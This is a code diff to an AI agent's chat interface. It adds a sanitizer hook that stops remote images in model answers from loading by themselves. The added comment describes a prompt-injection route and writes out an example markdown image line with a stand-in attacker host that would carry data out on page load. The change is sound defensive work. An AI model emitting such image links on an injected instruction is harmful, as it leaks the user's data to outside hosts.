@@ -21,6 +21,18 @@ function contextMax() { const id = $('#modelSel')?.value; return S.info?.models.
 
 // ---------- markdown ----------
 marked.use({ gfm: true, breaks: false });
+// A picture in an answer must never load by itself: a prompt injection (a web page or file the agent read)
+// could make the model write ![](https://attacker/?data=…) and the window would send that data out on
+// load. Web images become a plain link the user can open on purpose; data: images (screenshots) stay.
+DOMPurify.addHook('uponSanitizeElement', (node, data) => {
+  if (data.tagName !== 'img') return;
+  const src = node.getAttribute('src') || '';
+  if (/^data:image\//i.test(src)) return;
+  const a = document.createElement('a');
+  a.textContent = `[image: ${node.getAttribute('alt') || src.replace(/^https?:\/\//i, '').slice(0, 60)}]`;
+  if (/^https?:\/\//i.test(src)) a.setAttribute('href', src);
+  node.replaceWith(a);
+});
 function renderMd(el, text, final) {
   el.innerHTML = DOMPurify.sanitize(marked.parse(text || ''));
   el.querySelectorAll('a').forEach((a) => a.setAttribute('target', '_blank'));
